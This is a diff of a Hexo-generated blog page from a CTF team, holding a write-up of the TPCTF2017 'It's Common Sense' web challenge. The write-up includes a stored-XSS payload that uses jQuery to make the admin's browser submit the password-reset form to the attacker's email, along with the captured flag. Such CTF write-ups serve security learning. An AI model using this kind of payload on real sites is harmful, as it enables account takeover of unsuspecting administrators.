@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="format-detection" content="telephone=no,email=no,adress=no">
   <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
+  <meta name="theme-color" content="#000000">
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+  <meta http-equiv="window-target" content="_top">
   
   <title>[Web] TPCTF2017 - It&#39;s Common Sense | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="It’s Common Sense100Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email send">
@@ -44,7 +44,7 @@
 
   <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
 
 <body class="main-center">
   <section class="mainside">
@@ -65,7 +65,7 @@
 
     <form class="search-form sidebar-form">
         <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <input type="text" class="search-form-input form-control" placeholder="Search">
             <span class="input-group-btn">
                 <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
             </span>
@@ -75,7 +75,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech="">
             <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
         </div>
@@ -162,11 +162,11 @@
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="fa fa-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="fa fa-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="fa fa-rss"></i></a></li>
         
     </ul>
     
@@ -331,7 +331,7 @@
   
   <section class="main">
   <div class="content">
-  <article id="post-Web-TPCTF2017-It-s-Common-Sense" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Web-TPCTF2017-It-s-Common-Sense" class="article article-type-post" itemscope="" itemprop="blogPost">
     
     <header class="article-header">
       
@@ -370,7 +370,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 339 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 352 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 2 (min)</span>
@@ -385,10 +385,10 @@
 <p>A XSS challenge, we do have a <strong>register form</strong> and a <strong>login page</strong>, after signing up we can visit two forms in the <strong>account page</strong>, one is to <strong>sent a review</strong> to the admin, and the other is to <strong>reset the password</strong> (the new password was send to the email submitted in the form).</p>
 <p>My first intuition was to try easiest thing that is to steal the session cookie, unfortunately this wouldn’t work because the session cookie was protected with a <strong>http only</strong> flag, which <strong>prevents</strong> it from being stolen with XSS. The solution was to instead of trying to get the cookies we can make the admin to <strong>submit the password reset form</strong>! We can do this this with <strong>Ajax/Jquery</strong></p>
 <p>The first line of the code is to import <code>Jquery</code>:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">	$.ajax(&#123;</span></div><div class="line"><span class="javascript">	    type: <span class="string">"POST"</span>,</span></div><div class="line"><span class="javascript">	    url: <span class="string">"/account"</span>,</span></div><div class="line"><span class="javascript">	    data: <span class="string">'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request'</span>,</span></div><div class="line"><span class="javascript">	    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></div><div class="line"><span class="javascript">	        <span class="built_in">console</span>.log(<span class="string">'success'</span>);</span></div><div class="line"><span class="undefined">	    &#125;</span></div><div class="line"><span class="undefined">	&#125;);</span></div><div class="line"><span class="undefined">&#125;);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>Submitting the form like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/mpvECw9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/mpvECw9.png" alt=""><br></a><br>If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console:<br><a data-fancybox="gallery" href="https://i.imgur.com/g81VCRj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/g81VCRj.png" alt=""><br></a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">$( <span class="built_in">document</span> ).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	$.ajax(&#123;</span></span><br><span class="line"><span class="javascript">	    type: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="javascript">	    url: <span class="string">"/account"</span>,</span></span><br><span class="line"><span class="javascript">	    data: <span class="string">'email=s2020685%40mvrht.net&amp;formbtn=Send%20Request'</span>,</span></span><br><span class="line"><span class="javascript">	    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	        <span class="built_in">console</span>.log(<span class="string">'success'</span>);</span></span><br><span class="line"><span class="undefined">	    &#125;</span></span><br><span class="line"><span class="undefined">	&#125;);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Submitting the form like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/mpvECw9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mpvECw9.png" alt=""><br></a><br>If we check our own review we can notice that the post request is being done correctly and the log message success is printed in the js console:<br><a data-fancybox="gallery" href="https://i.imgur.com/g81VCRj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/g81VCRj.png" alt=""><br></a></p>
 <p>After a while we would receive an email with the flag:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations! Normally, you would&apos;ve reset the administrators password. For the purposes of this challenge, the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -453,7 +453,7 @@
   
 </div>
 
-  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <nav class="bar bar-footer clearfix" data-stick-bottom="">
   
   <ul class="pager pull-left">
     
